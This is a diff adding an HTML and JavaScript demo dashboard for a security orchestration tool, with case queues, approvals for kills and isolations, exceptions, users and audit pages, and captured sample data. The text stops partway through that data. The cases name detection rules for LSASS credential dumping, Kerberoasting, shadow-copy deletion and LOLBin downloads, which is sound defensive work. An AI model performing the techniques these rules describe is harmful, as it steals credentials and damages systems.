@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SOAR-SME dashboard (demo)</title>
+<link rel="icon" href="data:,">
+<style>
+:root {
+  --paper: #F3F5F8;
+  --surface: #FFFFFF;
+  --ink: #1D2433;
+  --muted: #5B6577;
+  --rule: #D5DBE5;
+  --link: #2F5DA8;
+  --sev-low: #7A8AA6;
+  --sev-med: #B07D12;
+  --sev-high: #C93D3D;
+  --sev-crit: #8E1F4C;
+  --tp: #C93D3D;
+  --fp: #2F7A55;
+  --review: #B07D12;
+  --pending: #7A8AA6;
+  --bar: #9FB1CF;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --paper: #121822;
+    --surface: #19212D;
+    --ink: #E3E8F0;
+    --muted: #9AA6B8;
+    --rule: #2C3747;
+    --link: #8AB0F0;
+    --sev-low: #8A9AB5;
+    --sev-med: #E0A63A;
+    --sev-high: #F07070;
+    --sev-crit: #E37AA6;
+    --tp: #F07070;
+    --fp: #6CC096;
+    --review: #E0A63A;
+    --pending: #8A9AB5;
+    --bar: #4A6290;
+    color-scheme: dark;
+  }
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; }
+body {
+  background: var(--paper);
+  color: var(--ink);
+  font-family: "Segoe UI Variable Text", "Segoe UI", system-ui, -apple-system, "Helvetica Neue", Arial, sans-serif;
+  font-size: 15px;
+  line-height: 1.5;
+  font-variant-numeric: tabular-nums;
+}
+[hidden] { display: none !important; }
+a { color: var(--link); }
+:focus-visible { outline: 2px solid var(--link); outline-offset: 2px; }
+.muted { color: var(--muted); }
+.small { font-size: 13px; }
+
+/* Top bar */
+.bar {
+  display: flex; align-items: center; justify-content: space-between; gap: 16px;
+  padding: 12px 24px; border-bottom: 1px solid var(--rule); background: var(--surface);
+}
+.brand { font-weight: 600; letter-spacing: 0.01em; }
+.bar-actions { display: flex; align-items: center; gap: 16px; font-size: 14px; }
+
+button { font: inherit; cursor: pointer; }
+.btn {
+  background: var(--ink); color: var(--paper); border: 1px solid var(--ink);
+  border-radius: 6px; padding: 7px 14px; font-weight: 600;
+}
+.btn-line {
+  background: transparent; color: var(--ink); border: 1px solid var(--rule);
+  border-radius: 6px; padding: 6px 12px;
+}
+.btn-line[aria-pressed="true"] { border-color: var(--ink); font-weight: 600; }
+.btn-quiet { background: none; border: 0; color: var(--link); padding: 4px 0; }
+button:disabled { opacity: 0.5; cursor: progress; }
+
+main { max-width: 1240px; margin: 0 auto; padding: 32px 24px 64px; }
+
+/* Overview: the headline is the only emphasis */
+.overview h1 {
+  font-family: "Segoe UI Variable Display", "Segoe UI", system-ui, sans-serif;
+  font-size: clamp(28px, 4.2vw, 46px); line-height: 1.12; font-weight: 600;
+  letter-spacing: -0.015em; margin: 0 0 12px; max-width: 24ch;
+}
+.facts { list-style: none; padding: 0; margin: 0 0 28px; display: flex; flex-wrap: wrap; gap: 6px 28px; color: var(--muted); }
+.charts { display: grid; grid-template-columns: 3fr 2fr; gap: 32px; padding-bottom: 32px; border-bottom: 1px solid var(--rule); }
+.chart { margin: 0; }
+.chart figcaption { font-size: 13px; color: var(--muted); margin-bottom: 10px; }
+.days { display: flex; align-items: flex-end; gap: 4px; height: 96px; }
+.days span { flex: 1; min-width: 6px; background: var(--bar); border-radius: 2px 2px 0 0; height: max(2px, var(--h, 0%)); }
+.days span.has { background: var(--ink); opacity: 0.75; }
+.days-axis { display: flex; justify-content: space-between; font-size: 12px; color: var(--muted); margin-top: 6px; }
+.techniques { list-style: none; margin: 0; padding: 0; display: grid; gap: 8px; }
+.techniques li { display: grid; grid-template-columns: 9.5em 1fr 2.5em; align-items: center; gap: 10px; font-size: 14px; }
+.techniques .t-bar { height: 8px; background: var(--bar); border-radius: 4px; width: var(--w, 0%); min-width: 4px; }
+.techniques .t-count { text-align: right; color: var(--muted); }
+
+/* Case queue */
+.queue { padding-top: 28px; }
+.queue-head { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; }
+.queue-head h2 { font-size: 20px; margin: 0 0 14px; font-weight: 600; }
+.filters { display: flex; flex-wrap: wrap; gap: 12px 16px; margin-bottom: 16px; }
+.filters label { display: grid; gap: 4px; font-size: 13px; color: var(--muted); }
+.filters .grow { flex: 1 1 220px; }
+select, input {
+  font: inherit; font-size: 14px; color: var(--ink); background: var(--surface);
+  border: 1px solid var(--rule); border-radius: 6px; padding: 6px 8px; min-height: 34px;
+}
+.table-wrap { overflow-x: auto; background: var(--surface); border: 1px solid var(--rule); border-radius: 8px; }
+table { width: 100%; border-collapse: collapse; font-size: 14px; }
+th { text-align: left; font-weight: 600; font-size: 13px; color: var(--muted); padding: 10px 12px; border-bottom: 1px solid var(--rule); white-space: nowrap; }
+td { padding: 10px 12px; border-bottom: 1px solid var(--rule); vertical-align: top; }
+tbody tr:last-child td { border-bottom: 0; }
+tbody tr { cursor: pointer; }
+tbody tr:hover, tbody tr.selected { background: color-mix(in srgb, var(--link) 7%, transparent); }
+td.desc { min-width: 240px; }
+td.num, th.num { text-align: right; }
+.nowrap { white-space: nowrap; }
+.level { display: inline-flex; align-items: center; gap: 8px; font-weight: 600; white-space: nowrap; }
+.level::before { content: ""; width: 4px; height: 18px; border-radius: 2px; background: var(--sev-low); }
+.level.med::before { background: var(--sev-med); }
+.level.high::before { background: var(--sev-high); }
+.level.crit::before { background: var(--sev-crit); }
+.verdict { display: inline-flex; align-items: center; gap: 6px; white-space: nowrap; font-weight: 600; }
+.verdict::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--pending); }
+.verdict.TP::before { background: var(--tp); }
+.verdict.FP::before { background: var(--fp); }
+.verdict.NEEDS_REVIEW::before { background: var(--review); }
+.by { font-weight: 400; color: var(--muted); font-size: 13px; }
+.empty { padding: 28px 16px; margin: 0; color: var(--muted); }
+
+/* Case detail panel */
+.detail {
+  position: fixed; top: 0; right: 0; bottom: 0; width: min(580px, 100%);
+  background: var(--surface); border-left: 1px solid var(--rule);
+  overflow-y: auto; padding: 20px 24px 40px; z-index: 20;
+  box-shadow: -12px 0 32px rgba(15, 23, 42, 0.12);
+}
+.backdrop { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.28); z-index: 10; }
+.detail-head { display: flex; justify-content: space-between; align-items: center; gap: 12px; }
+.detail-meta { display: flex; flex-wrap: wrap; gap: 6px 16px; align-items: center; font-size: 14px; }
+.detail h2 { font-size: 22px; line-height: 1.25; margin: 14px 0 18px; font-weight: 600; }
+.detail h3 { font-size: 15px; margin: 24px 0 8px; font-weight: 600; }
+.fields { display: grid; grid-template-columns: 8em 1fr; gap: 6px 16px; margin: 0; font-size: 14px; }
+.fields dt { color: var(--muted); }
+.fields dd { margin: 0; overflow-wrap: anywhere; }
+.reason { margin: 0; padding: 12px 14px; border-left: 3px solid var(--rule); background: var(--paper); border-radius: 0 6px 6px 0; }
+.actions { display: flex; flex-wrap: wrap; gap: 8px; }
+.query { display: flex; gap: 8px; }
+.query input { flex: 1; font-family: Consolas, "Cascadia Mono", monospace; font-size: 13px; }
+details summary { cursor: pointer; color: var(--link); margin-top: 24px; }
+pre {
+  background: var(--paper); border: 1px solid var(--rule); border-radius: 6px; padding: 12px;
+  font-family: Consolas, "Cascadia Mono", monospace; font-size: 12.5px; overflow-x: auto; max-height: 420px;
+}
+
+/* Tabs, chips, secondary pages */
+.tabs { display: flex; gap: 4px; flex-wrap: wrap; }
+.tabs button { background: none; border: 0; border-bottom: 2px solid transparent; padding: 6px 10px;
+  color: var(--muted); font: inherit; font-size: 14px; cursor: pointer; }
+.tabs button[aria-selected="true"] { color: var(--ink); border-bottom-color: var(--link); font-weight: 600; }
+.chip { display: inline-block; padding: 0 8px; border-radius: 999px; font-size: 12.5px; line-height: 20px;
+  border: 1px solid var(--rule); white-space: nowrap; }
+.chip.high, .chip.failed { color: var(--tp); border-color: var(--tp); }
+.chip.medium, .chip.sent, .chip.skipped { color: var(--review); border-color: var(--review); }
+.chip.low, .chip.done { color: var(--fp); border-color: var(--fp); }
+.panel { background: var(--surface); border: 1px solid var(--rule); border-radius: 8px; padding: 16px 20px; margin-bottom: 16px; }
+.panel h3 { margin: 0; font-size: 17px; font-weight: 600; }
+.agent-head { display: flex; flex-wrap: wrap; gap: 6px 16px; align-items: baseline; margin-bottom: 10px; }
+.panel table { font-size: 13.5px; }
+.banner { padding: 10px 14px; border-left: 3px solid var(--review); background: var(--surface); margin: 0 0 16px; }
+.settings-list { display: grid; gap: 12px; }
+.setting { display: grid; grid-template-columns: 1fr auto; gap: 6px 16px; align-items: start; }
+.setting label { font-weight: 600; }
+.setting p { margin: 0; grid-column: 1 / -1; }
+.setting .control { display: flex; gap: 8px; align-items: center; }
+.setting textarea { width: min(420px, 100%); min-height: 72px; font-family: Consolas, "Cascadia Mono", monospace; font-size: 13px; }
+.setting input[type="number"] { width: 6em; }
+.setting input[type="text"] { width: 16em; }
+.list { margin: 0; padding-left: 18px; font-size: 14px; }
+.list li { margin: 4px 0; }
+
+/* Sign-in */
+.login { min-height: 100vh; display: grid; place-items: center; padding: 24px; }
+.login form { width: min(360px, 100%); display: grid; gap: 14px; }
+.login h1 { margin: 0; font-size: 28px; font-weight: 600; }
+.login p { margin: 0; }
+.login label { display: grid; gap: 4px; font-size: 13px; color: var(--muted); }
+.error { color: var(--tp); font-size: 14px; }
+
+.toast {
+  position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%);
+  background: var(--ink); color: var(--paper); padding: 8px 16px; border-radius: 6px;
+  font-size: 14px; z-index: 30; opacity: 0; pointer-events: none; transition: opacity 0.2s;
+}
+.toast.show { opacity: 1; }
+
+@media (max-width: 760px) {
+  .bar { padding: 10px 16px; }
+  main { padding: 24px 16px 48px; }
+  .charts { grid-template-columns: 1fr; }
+  .fields { grid-template-columns: 1fr; }
+  .fields dt { margin-top: 6px; }
+}
+@media (prefers-reduced-motion: reduce) {
+  .toast { transition: none; }
+}
+  /* Group modes editor */
+  .group-modes { width: 100%; border-collapse: collapse; margin: .5rem 0; }
+  .group-modes th, .group-modes td { text-align: left; padding: .3rem .4rem .3rem 0; }
+  .group-modes input, .group-modes select { width: 100%; }
+  .group-modes td:last-child { width: 1%; white-space: nowrap; }
+  .setting .fallback { display: inline-flex; gap: .4rem; align-items: center; font-weight: normal; }
+
+/* approvals, settings, dialogs */
+.badge { display: inline-block; min-width: 18px; padding: 0 6px; border-radius: 999px; background: var(--tp); color: #fff; font-size: 12px; line-height: 18px; text-align: center; }
+.inline { display: inline-flex; gap: 6px; align-items: center; font-size: 13px; color: var(--muted); }
+.form-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px 16px; align-items: end; }
+.form-grid label { display: grid; gap: 4px; font-size: 13px; color: var(--muted); }
+.form-grid .wide { grid-column: 1 / -1; }
+.form-grid h3 { margin: 0; }
+.form-grid textarea { width: 100%; font-family: Consolas, "Cascadia Mono", monospace; font-size: 12.5px; }
+.banner.warn { border-left-color: var(--tp); }
+.banner.info { border-left-color: var(--link); }
+.row-actions { display: flex; gap: 6px; flex-wrap: wrap; }
+.dialog-wrap { display: grid; place-items: center; z-index: 25; }
+.dialog { width: min(480px, calc(100% - 32px)); display: grid; gap: 12px; }
+.dialog label { display: grid; gap: 4px; font-size: 13px; color: var(--muted); }
+.settings-section h3 { margin: 0 0 12px; }
+table.compact td, table.compact th { padding: 7px 10px; }
+.mono { font-family: Consolas, "Cascadia Mono", monospace; font-size: 12.5px; overflow-wrap: anywhere; }
+</style>
+</head>
+<body>
+
+<section id="login" class="login" hidden>
+  <form id="login-form" autocomplete="on">
+    <h1>SOAR-SME</h1>
+    <p class="muted">Sign in to review and handle cases.</p>
+    <label>Username <input name="username" autocomplete="username" required></label>
+    <label>Password <input name="password" type="password" autocomplete="current-password" required></label>
+    <p id="login-error" class="error" role="alert" hidden></p>
+    <button class="btn" type="submit">Sign in</button>
+    <button id="forgot-link" class="btn-quiet" type="button">Forgot your password?</button>
+  </form>
+  <form id="totp-form" hidden autocomplete="off">
+    <h1>Two-factor sign-in</h1>
+    <p class="muted">Enter the 6-digit code from your authenticator app.</p>
+    <label>Code <input name="code" inputmode="numeric" pattern="[0-9 ]{6,7}" autocomplete="one-time-code" required></label>
+    <p id="totp-error" class="error" role="alert" hidden></p>
+    <button class="btn" type="submit">Verify</button>
+  </form>
+  <form id="forgot-form" hidden>
+    <h1>Forgot your password</h1>
+    <p class="muted">There is no e-mail: your request appears on the dashboard of the admins, who give you a temporary password.</p>
+    <label>Username <input name="username" autocomplete="username" required></label>
+    <p id="forgot-msg" class="muted" role="status" hidden></p>
+    <button class="btn" type="submit">Send the request</button>
+    <button id="back-login" class="btn-quiet" type="button">Back to sign-in</button>
+  </form>
+</section>
+
+<div id="app" hidden>
+  <header class="bar">
+    <div class="brand">SOAR-SME</div>
+    <nav class="tabs" role="tablist" aria-label="Pages">
+      <button type="button" role="tab" data-tab="cases" aria-selected="true">Cases</button>
+      <button type="button" role="tab" data-tab="approvals" aria-selected="false">Approvals <span id="approvals-badge" class="badge" hidden></span></button>
+      <button type="button" role="tab" data-tab="actions" aria-selected="false">Actions</button>
+      <button type="button" role="tab" data-tab="incidents" aria-selected="false">Incidents</button>
+      <button type="button" role="tab" data-tab="agents" aria-selected="false">Hosts &amp; logs</button>
+      <button type="button" role="tab" data-tab="knowledge" aria-selected="false">Knowledge</button>
+      <button type="button" role="tab" data-tab="exceptions" aria-selected="false">Exceptions</button>
+      <button type="button" role="tab" data-tab="users" data-role="admin" aria-selected="false">Users</button>
+      <button type="button" role="tab" data-tab="audit" data-role="admin" aria-selected="false">Audit</button>
+      <button type="button" role="tab" data-tab="settings" aria-selected="false">Settings</button>
+    </nav>
+    <nav class="bar-actions" aria-label="Account">
+      <a id="wazuh-link" href="#" target="_blank" rel="noopener" hidden>Open Wazuh</a>
+      <button id="who" class="btn-quiet" type="button" data-tab="account"></button>
+      <button id="logout" class="btn-quiet" type="button">Sign out</button>
+    </nav>
+  </header>
+
+  <main>
+    <div id="banners"></div>
+
+    <div id="tab-cases" class="page">
+      <section class="overview" aria-labelledby="headline">
+        <h1 id="headline">Loading…</h1>
+        <ul id="facts" class="facts"></ul>
+        <div class="charts">
+          <figure class="chart">
+            <figcaption>New cases per day, last 14 days</figcaption>
+            <div id="per-day" class="days" role="img" aria-label="New cases per day"></div>
+            <div class="days-axis"><span id="day-first"></span><span id="day-last"></span></div>
+          </figure>
+          <figure class="chart">
+            <figcaption>Most frequent techniques, last 14 days</figcaption>
+            <ol id="techniques" class="techniques"></ol>
+            <p id="techniques-empty" class="muted small" hidden>No cases yet.</p>
+          </figure>
+        </div>
+      </section>
+      <section class="queue" aria-labelledby="queue-title">
+        <div class="queue-head"><h2 id="queue-title">Cases</h2><span id="updated" class="muted small"></span></div>
+        <form id="filters" class="filters">
+          <label>Status <select name="status"><option value="open" selected>Open</option><option value="closed">Closed</option><option value="all">All</option></select></label>
+          <label>Verdict <select name="verdict"><option value="all" selected>All</option><option value="TP">TP</option><option value="FP">FP</option><option value="NEEDS_REVIEW">Needs review</option></select></label>
+          <label>Risk <select name="risk"><option value="all" selected>All</option><option value="high">High</option><option value="medium">Medium</option><option value="low">Low</option></select></label>
+          <label>Min level <select name="min_level"><option value="0" selected>Any</option><option value="10">10</option><option value="12">12</option><option value="14">14</option></select></label>
+          <label>Period <select name="days"><option value="1">24 hours</option><option value="7" selected>7 days</option><option value="30">30 days</option><option value="90">90 days</option></select></label>
+          <label>Host <input name="agent" type="search" placeholder="e.g. WS-FIN-01" autocomplete="off"></label>
+          <label class="grow">Search <input name="q" type="search" placeholder="Description, technique, IP or process" autocomplete="off"></label>
+          <input name="incident" type="hidden" value="0">
+        </form>
+        <p id="incident-filter" class="banner" hidden></p>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Level</th><th>Description</th><th>Technique</th><th>Host</th><th>Source</th><th class="num">Alerts</th><th>Verdict</th><th>Risk</th><th>Your verdict</th><th>Last seen</th></tr></thead>
+            <tbody id="rows"></tbody>
+          </table>
+          <p id="empty" class="empty" hidden>No case matches these filters.</p>
+        </div>
+      </section>
+    </div>
+
+    <section id="tab-approvals" class="page" hidden>
+      <div class="queue-head"><h2>Approvals</h2>
+        <label class="inline">Show <select id="approvals-status"><option value="pending" selected>Waiting</option><option value="all">All (7 days)</option><option value="expired">Expired</option></select></label></div>
+      <p class="muted small">Kills and isolations that wait for a decision. A request expires after the time set in Settings; then nothing is done and it is recorded as expired.</p>
+      <div id="approvals" class="table-wrap"></div>
+    </section>
+
+    <section id="tab-actions" class="page" hidden>
+      <div class="queue-head"><h2>Actions, last 7 days</h2></div>
+      <div id="actions" class="table-wrap"></div>
+    </section>
+
+    <section id="tab-incidents" class="page" hidden>
+      <div class="queue-head"><h2>Incidents</h2>
+        <label class="inline">Show <select id="incidents-status"><option value="open" selected>Open</option><option value="all">All</option></select></label></div>
+      <p class="muted small">The same behaviour on several hosts within a short time (possible outbreak).</p>
+      <div id="incidents" class="table-wrap"></div>
+    </section>
+
+    <section id="tab-agents" class="page" hidden>
+      <div class="queue-head"><h2>Hosts &amp; logs</h2></div>
+      <div id="agents"></div>
+    </section>
+
+    <section id="tab-knowledge" class="page" hidden>
+      <div class="queue-head"><h2>Knowledge</h2></div>
+      <p class="muted small">Verdicts reused for later cases with the same signature, without AI and TI. AI verdicts and analyst verdicts expire after the days set in Settings; renew the ones you trust.</p>
+      <form id="knowledge-filters" class="filters">
+        <label>State <select name="state"><option value="active" selected>Active</option><option value="expired">Expired</option><option value="disabled">Switched off</option><option value="all">All</option></select></label>
+        <label class="grow">Search <input name="q" type="search" placeholder="Rule description or signature"></label>
+      </form>
+      <div id="knowledge" class="table-wrap"></div>
+    </section>
+
+    <section id="tab-exceptions" class="page" hidden>
+      <div class="queue-head"><h2>Exceptions</h2></div>
+      <p class="muted small">Known-good behaviour. <b>Suppress</b> closes the case at once without a message; <b>No action</b> keeps the case but never acts on it. Prefer a full path or a SHA-256 to a broad match.</p>
+      <form id="exception-form" class="panel form-grid" data-role="admin">
+        <label>Rule id <input name="rule_id" type="number" min="100000" max="999999" placeholder="any"></label>
+        <label>Scope <select name="scope"><option value="global">All hosts</option><option value="group">Group</option><option value="host">Host</option></select></label>
+        <label>Group / host <input name="scope_value" placeholder="client or WS-FIN-01"></label>
+        <label>Match <select name="match_type"><option value="process_path">Process path (exact, or ending with \ or *)</option><option value="sha256">SHA-256</option><option value="command_contains">Command line contains</option><option value="any">Anything for this rule</option></select></label>
+        <label class="wide">Value <input name="match_value" placeholder="C:\Program Files\Backup\agent.exe"></label>
+        <label>Effect <select name="effect"><option value="no_action">No action</option><option value="suppress">Suppress</option></select></label>
+        <label>Expires after (days) <input name="expires_days" type="number" min="1" max="3650" placeholder="never"></label>
+        <label class="wide">Note <input name="note" maxlength="300" placeholder="Why this is safe"></label>
+        <div><button class="btn" type="submit">Add exception</button></div>
+      </form>
+      <div id="exceptions" class="table-wrap"></div>
+    </section>
+
+    <section id="tab-users" class="page" hidden>
+      <div class="queue-head"><h2>Users</h2></div>
+      <div id="reset-requests"></div>
+      <form id="user-form" class="panel form-grid">
+        <label>Username <input name="username" required pattern="[A-Za-z0-9._@\-]{3,60}"></label>
+        <label>Role <select name="role"><option value="viewer">Viewer (read only)</option><option value="analyst" selected>Analyst (verdicts, approvals)</option><option value="admin">Admin (everything)</option></select></label>
+        <label>Telegram user id <input name="telegram_id" type="number" placeholder="for Approve / Reject buttons"></label>
+        <div><button class="btn" type="submit">Create user</button></div>
+      </form>
+      <p id="temp-password" class="banner" role="status" hidden></p>
+      <div id="users" class="table-wrap"></div>
+    </section>
+
+    <section id="tab-audit" class="page" hidden>
+      <div class="queue-head"><h2>Audit log</h2></div>
+      <form id="audit-filters" class="filters">
+        <label>Period <select name="days"><option value="1">24 hours</option><option value="7" selected>7 days</option><option value="30">30 days</option><option value="365">1 year</option></select></label>
+        <label>User <input name="user" type="search"></label>
+        <label class="grow">Action <input name="action" type="search" placeholder="login, approval, setting, action..."></label>
+      </form>
+      <div id="audit" class="table-wrap"></div>
+    </section>
+
+    <section id="tab-settings" class="page" hidden>
+      <div class="queue-head"><h2>Settings</h2></div>
+      <p id="settings-readonly" class="banner" hidden>Only admins can change settings.</p>
+      <div id="settings"></div>
+    </section>
+
+    <section id="tab-account" class="page" hidden>
+      <div class="queue-head"><h2>Your account</h2></div>
+      <p id="must-change" class="banner" hidden>You signed in with a temporary password: choose your own password to continue.</p>
+      <form id="password-form" class="panel form-grid">
+        <h3 class="wide">Change password</h3>
+        <label>Current password <input name="current" type="password" autocomplete="current-password" required></label>
+        <label>New password (12+ characters) <input name="new" type="password" autocomplete="new-password" minlength="12" required></label>
+        <div><button class="btn" type="submit">Change password</button></div>
+      </form>
+      <div id="totp-panel" class="panel"></div>
+    </section>
+  </main>
+</div>
+
+<div id="backdrop" class="backdrop" hidden></div>
+<aside id="detail" class="detail" hidden aria-label="Case detail"></aside>
+<div id="dialog" class="backdrop dialog-wrap" hidden><form id="dialog-form" class="panel dialog"></form></div>
+<div id="toast" class="toast" role="status" aria-live="polite"></div>
+
+<script>
+// Demo shim: answers the dashboard's API calls with sample data captured from the real backend.
+(() => {
+  const CAPTURED = 1793030249555;
+  const D = JSON.parse(JSON.stringify({"/api/me":{"user":"admin","role":"admin","must_change":false,"totp_enabled":true,"telegram_id":null,"wazuh_url":"https://10.0.0.5","data_mode":"cloud","paused":false,"pause_until":null},"/api/stats":{"days":14,"per_day":[{"day":"2026-10-13","cases":1},{"day":"2026-10-14","cases":4},{"day":"2026-10-15","cases":2},{"day":"2026-10-16","cases":0},{"day":"2026-10-17","cases":3},{"day":"2026-10-18","cases":1},{"day":"2026-10-19","cases":4},{"day":"2026-10-20","cases":3},{"day":"2026-10-21","cases":0},{"day":"2026-10-22","cases":4},{"day":"2026-10-23","cases":2},{"day":"2026-10-24","cases":5},{"day":"2026-10-25","cases":5},{"day":"2026-10-26","cases":9}],"techniques":[{"technique":"T1105","cases":29},{"technique":"T1059.005","cases":5},{"technique":"T1003.001","cases":1},{"technique":"T1110.001","cases":1},{"technique":"T1110.003","cases":1},{"technique":"T1204","cases":1}],"totals":{"open_cases":15,"needs_review":10,"open_high":5,"recent_cases":43,"ai_cases":6,"reused_cases":28,"compared":0,"agreed":0,"kills_done":2,"notices":13,"pending_approvals":2,"open_incidents":1},"system":{"capacity":{"cpu":8,"active":7,"agents":7,"issues":[],"ram_gb":16,"status":"ok","disk_gb":512,"planned":60,"days_left":210,"discarded":0,"disk_used_pct":38.5,"events_dropped":0},"notify_errors":[],"retention_last_run":null,"sync":null,"paused":false,"pause_until":null,"data_mode":"cloud","auto_action":true}},"/api/cases":[{"id":43,"rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_name":"KIOSK-01","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"verdict_by":"policy","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T15:48:23.252793+00:00","last_seen":"2026-10-26T15:48:23.252793+00:00","incident_id":1,"close_reason":null,"host_mode":"monitor","storm":false,"first_seen_env":false},{"id":42,"rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_name":"WS-SALES-03","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"verdict_by":"policy","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T15:44:23.252793+00:00","last_seen":"2026-10-26T15:44:23.252793+00:00","incident_id":1,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":41,"rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_name":"WS-HR-01","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"verdict_by":"policy","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T15:40:23.252793+00:00","last_seen":"2026-10-26T15:40:23.252793+00:00","incident_id":1,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":40,"rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"verdict_by":"policy","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T15:36:23.252793+00:00","last_seen":"2026-10-26T15:36:23.252793+00:00","incident_id":1,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":1,"rule_id":100140,"rule_level":13,"rule_desc":"Suspicious handle opened to LSASS","technique":"T1003.001","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"TP","confidence":1.0,"verdict_by":"rule","risk":"high","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T15:33:23.252793+00:00","last_seen":"2026-10-26T15:34:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":39,"rule_id":100221,"rule_level":11,"rule_desc":"Script host ran a script from Downloads or a temporary folder","technique":"T1059.005","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":null,"verdict_by":"policy","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T15:32:23.252793+00:00","last_seen":"2026-10-26T15:32:23.252793+00:00","incident_id":1,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":2,"rule_id":100200,"rule_level":14,"rule_desc":"Shadow copies deleted or shrunk (ransomware precursor)","technique":"T1490","agent_name":"WS-SALES-03","source_ip":null,"alert_count":3,"verdict":"TP","confidence":1.0,"verdict_by":"rule","risk":"high","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T14:27:23.252793+00:00","last_seen":"2026-10-26T14:30:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":3,"rule_id":100176,"rule_level":13,"rule_desc":"Microsoft Defender detected malware","technique":"T1204","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"TP","confidence":1.0,"verdict_by":"rule","risk":"high","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T10:57:23.252793+00:00","last_seen":"2026-10-26T10:58:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":4,"rule_id":100220,"rule_level":12,"rule_desc":"Office document or PDF reader started a shell or script host (malicious document)","technique":"T1204.002","agent_name":"WS-HR-01","source_ip":null,"alert_count":2,"verdict":"TP","confidence":0.86,"verdict_by":"ai","risk":"high","analyst_verdict":null,"status":"open","first_seen":"2026-10-26T07:57:23.252793+00:00","last_seen":"2026-10-26T07:59:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":5,"rule_id":100231,"rule_level":12,"rule_desc":"Brute force: 10+ failed logons from 203.0.113.45 within 2 minutes","technique":"T1110.001","agent_name":"SRV-FILE-01","source_ip":"203.0.113.45","alert_count":14,"verdict":"NEEDS_REVIEW","confidence":0.55,"verdict_by":"ai","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-25T19:57:23.252793+00:00","last_seen":"2026-10-25T20:11:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"notify","storm":false,"first_seen_env":false},{"id":37,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-25T15:57:23.252793+00:00","last_seen":"2026-10-25T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":38,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-25T14:57:23.252793+00:00","last_seen":"2026-10-25T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":6,"rule_id":100110,"rule_level":14,"rule_desc":"HONEYTOKEN: service ticket requested for decoy SPN account (Kerberoasting)","technique":"T1558.003","agent_name":"DC01","source_ip":"10.0.10.37","alert_count":1,"verdict":"TP","confidence":1.0,"verdict_by":"rule","risk":"high","analyst_verdict":null,"status":"open","first_seen":"2026-10-25T13:57:23.252793+00:00","last_seen":"2026-10-25T13:58:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"notify","storm":false,"first_seen_env":false},{"id":7,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":0.6,"verdict_by":"ai","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-25T09:57:23.252793+00:00","last_seen":"2026-10-25T09:58:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":false},{"id":33,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a 